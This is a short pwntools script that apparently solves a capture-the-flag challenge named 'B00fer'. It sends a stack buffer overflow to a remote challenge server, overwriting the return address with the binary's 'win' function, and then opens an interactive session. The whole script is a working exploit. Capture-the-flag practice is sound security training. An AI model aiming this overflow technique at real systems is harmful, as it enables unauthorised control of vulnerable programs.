from pwn import *

context.binary = elf = ELF('B00fer')

#pr = process('B00fer')
pr = remote('b00fer.niccgetsspooky.xyz',9001)
pr.sendline(b'a'*0x28+p64(elf.symbols['win']))

#print(pr.recvall(timeout=1))
pr.interactive()
